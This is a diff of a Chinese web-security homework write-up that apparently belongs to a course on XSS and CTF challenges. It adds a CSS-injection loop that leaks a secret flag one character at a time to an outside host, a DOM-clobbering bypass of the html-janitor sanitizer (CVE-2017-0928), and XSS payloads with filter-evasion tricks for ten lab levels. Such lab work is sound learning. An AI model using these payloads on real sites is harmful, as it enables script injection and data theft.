@@ -44,15 +44,6 @@ import PasswordContainer from '@md-components/passwordContainer.vue';
 html:,head:,body:,title:,div:main,h1:,p:,ul:,li:item1,li:item2
 ```
 
-然后计算`s`的 `MD5` 值,在外面加上`AAA{}` 的格式提交,题目平台的`flag`按照以下代码生成:
-
-```python
-import hashlib
-s = "......"
-md5_hash = hashlib.md5(s.encode()).hexdigest()
-print("AAA{" + md5_hash + "}")
-```
-
 </Card>
 
 
@@ -196,7 +187,15 @@ if __name__ == '__main__':
 
 </Card>
 
-~~环境有点逆天了~~
+怎么说呢 参考Gradient解法，但是
+```js
+for(let j=48;j<120;j++){
+  payload +=  `input[name=secret][value^="AAA{${String.fromCharCode(j)}"]`+
+  `{background-image: url(${host}/leak-${j});}`;
+}
+```
+用这种办法每次leak一位
+
 
 # Task 3: node._sanitized (30 分)
 
@@ -204,6 +203,28 @@ if __name__ == '__main__':
 结合课上讲的 DOM Clobbering  知识,搜索并简要解释 CVE-2017-0928 的原理
 </Card>
 
+ref: [Node.js third-party modules | Report #308158 - [html-janitor] Bypassing sanitization using DOM clobbering | HackerOne](https://hackerone.com/reports/308158)
+
+```js
+var myJanitor = new HTMLJanitor({tags:{p:{}}});
+var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain)"+
+                                " name=_sanitized></object></form>")
+console.log(cleanHtml) 
+// logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
+```
+
+对应的代码
+
+```js
+do {
+  // Ignore nodes that have already been sanitized
+  if (node._sanitized) {
+      continue;
+  }
+...
+```
+
+意思是说，给一个object加上`name=_sanitized`，然后通过DOM Clobbering的方式，这个form元素的`_sanitized`就会是一个truthy value，就绕过了html-janitor。
 
 # Task 4: Gradient (30 分)
 
@@ -287,38 +308,35 @@ https://blog.5dbwat4.top/arch/SJTUCTF2025-Writeup-2#Gradient
 
 </Card>
 
-1. `http://test.ctf8.com/level1.php?name=<script>alert(1)</script>`
+1. `/level1.php?name=<script>alert()</script>`  
+   没有任何过滤
 
-    没有做任何防御
-    ```php
-    <?php 
-    ini_set("display_errors", 0);
-    $str = $_GET["name"];
-    echo "<h2 align=center>欢迎用户".$str."</h2>";
-    ?>
-    ```
-    
+2. `"><script>alert()</script>`  
+   闭合引号
 
-2. `http://test.ctf8.com/level2.php?keyword="><script>alert(11)</script>`
+3. `htmlspecialchars()`不过滤单引号  
+   payload是`' onfocus='alert()' autofocus '`
 
-    关键注入点在这里
-    ```php
-    '<input name=keyword  value="'.$str.'">'
-    ```
-    
+4. 添加了对尖括号的过滤，还用上面的payload
 
-3. 
+5. 过滤了`on`和`<script`  
+   payload是`"><iframe src="javascript:parent.alert()"></iframe>`
 
-# Task 7: 拓展 (20 分)
+6. 又过滤了`href`,`src`,`data`  
+   可以用大小写绕过。上面的payload中`src`改成`SrC`
 
-<Card title="任务" type="task">
+7. 强制改成小写再过滤。区别是先前`str_replace("on","o_n",$str2);`，现在是`str_replace("on","",$str2);`   
+   所以可以把关键词写两次  
+   payload是`"><iframe ssrcrc="javascriscriptpt:parent.alert()"></iframe>`
 
-简要回答下面两个问题,言之有理即可:
+8. 这一题和第9题上来就把`"`过滤了，不让闭合属性值。  
+   个人认为应该是没办法实现用户无交互的情况下触发的XSS，假定用户有一个点击链接的操作。  
+   污染href链接为javascript伪协议，`javascr&#x69;pt:alert(1)`
+9. 额外检查了链接中有无`http://`，意图应该是不让用伪协议。  
+   payload: `javascr&#x69;pt:alert();/*http://*/`
+10. `/level10.php?t_sort=" onfocus='alert()' autofocus type=text abc=`  
+    拼接后的HTML为`<input name="t_sort"  value="" onfocus='alert()' autofocus type=text abc=" type="hidden">`(第二个`type=`变成了属性值)
 
-- 自行搜索并学习**中间人攻击**,解释为什么我们要避免连接公共Wifi (如饭馆,咖啡厅)
 
-- 自行搜索并学习课上提到的**CSP 策略**,解释为什么 CSP 可以防止 XSS 攻击,并构造一个配置不当的 CSP 被绕过的例子(不需要给出代码实现,只需要描述)
-
-</Card> 
 
 </PasswordContainer>
